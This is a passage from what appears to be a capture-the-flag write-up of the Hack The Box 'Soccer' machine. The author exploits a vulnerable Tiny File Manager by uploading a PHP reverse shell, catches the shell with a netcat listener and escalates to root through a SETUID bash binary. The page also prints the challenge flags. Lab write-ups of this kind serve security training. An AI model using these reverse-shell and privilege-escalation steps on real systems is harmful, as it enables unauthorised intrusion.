/posts/htb/easy/soccer/images/tiny_hu7fc8558242fa70e70e662c6ed2094438_104655_1024x0_resize_q75_h2_box_3.webp 1024w" sizes=100vw src=images/tiny.png width=768 height=302 loading=lazy><figcaption></figcaption></figure></p><p>While I was digging, I noticed <code>Tiny File Manager 2.4.3</code> was vulnerable. After logging in, I got the confirmation that this was, in fact, the vulnerable version.</p><h3 id=cve-2021-45010>CVE-2021-45010<a hidden class=anchor aria-hidden=true href=#cve-2021-45010>#</a></h3><p>I tried to get <a href=https://github.com/febinrev/CVE-2021-45010-TinyFileManager-Exploit title="this POC" target=_blank rel="nofollow noopener">this POC</a> to work, but I was unable to.</p><p>Instead, I uploaded a rev shell from <a href=https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php title="Pentest Monkey" target=_blank rel="nofollow noopener">Pentest Monkey</a>.</p><p><figure class=image-caption><img alt=rev srcset="/posts/htb/easy/soccer/images/rev_huad3d26b07f0359bda3c3b089306d01f2_32684_480x0_resize_q75_h2_box_3.webp 480w,
/posts/htb/easy/soccer/images/rev_huad3d26b07f0359bda3c3b089306d01f2_32684_768x0_resize_q75_h2_box_3.webp 768w,
/posts/htb/easy/soccer/images/rev_huad3d26b07f0359bda3c3b089306d01f2_32684_1024x0_resize_q75_h2_box_3.webp 1024w" sizes=100vw src=images/rev.png width=768 height=229 loading=lazy><figcaption></figcaption></figure></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/htb/soccer<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ nc -lnvp <span class=m>1337</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>1337</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.16.20<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.194<span class=o>]</span> <span class=m>59904</span>
</span></span><span class=line><span class=cl>Linux soccer 5.4.0-135-generic <span class=c1>#152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span class=line><span class=cl> 23:14:57 up  1:34,  <span class=m>0</span> users,  load average: 0.00, 0.01, 0.01
</span></span><span class=line><span class=cl>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
</span></span><span class=line><span class=cl>/bin/sh: 0: can<span class=err>&#39;</span>t access tty<span class=p>;</span> job control turned off
</span></span><span class=line><span class=cl>$ whoami
</span></span><span class=line><span class=cl>www-data
</span></span><span class=line><span class=cl>$
</span></span></code></pre></div><h3 id=privesc>privesc<a hidden class=anchor aria-hidden=true href=#privesc>#</a></h3><p>From here, I ran <code>linpeas.sh</code> to see how to get to get to the <code>player</code> or <code>root</code> user. I noticed right away that <code>/usr/bin/bash</code> had the <code>SETUID</code> bit already, so all I had to do to get <code>root</code> was run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ /usr/bin/bash -p
</span></span><span class=line><span class=cl>whoami
</span></span><span class=line><span class=cl>root
</span></span></code></pre></div><p>Profit.</p><h3 id=flag>Flag<a hidden class=anchor aria-hidden=true href=#flag>#</a></h3><p><strong>user.txt:</strong> <code>7acd46137be252c987b73b6d702c3f92</code></p><p><strong>root.txt:</strong> <code>336175fd3a440ac7670fc0d47581331e</code></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://woadey.xyz/tags/tiny/>Tiny</a></li></ul><nav class=paginav><a class=prev href=https://woadey.xyz/posts/htb/easy/nibbles/><span class=title>« Prev</span><br><span>HTB Writeup: Nibbles</span>
</a><a class=next href=https://woadey.xyz/posts/htb/easy/precious/><span class=title>Next »</span><br><span>HTB Writeup: Precious</span></a></nav></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>